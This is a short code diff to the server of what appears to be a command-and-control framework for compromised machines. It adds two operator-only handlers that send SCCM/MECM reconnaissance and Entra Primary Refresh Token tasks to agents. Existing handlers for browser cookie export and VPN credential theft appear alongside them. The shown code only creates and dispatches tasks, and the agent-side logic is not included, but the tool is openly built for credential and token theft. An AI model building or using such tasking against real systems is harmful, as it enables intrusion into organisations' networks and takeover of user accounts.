@@ -36,6 +36,38 @@ func (s *Server) handleCookieExport(c *gin.Context) {
 	s.dispatchTask(c, task, "cookie_export", "Cookie export: "+browser)
 }
 
+func (s *Server) handleSccmRecon(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "sccm_recon", "", "", "", "", 0, 0, callerOpts(c)...)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	s.dispatchTask(c, task, "sccm_recon", "SCCM/MECM recon")
+}
+
+func (s *Server) handleEntraPRT(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "entra_prt", "", "", "", "", 0, 0, callerOpts(c)...)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	s.dispatchTask(c, task, "entra_prt", "Entra PRT recon")
+}
+
 // handleVpnCreds dispatches vpn_creds task to the agent.
 func (s *Server) handleVpnCreds(c *gin.Context) {
 	if !s.requireOperator(c) {
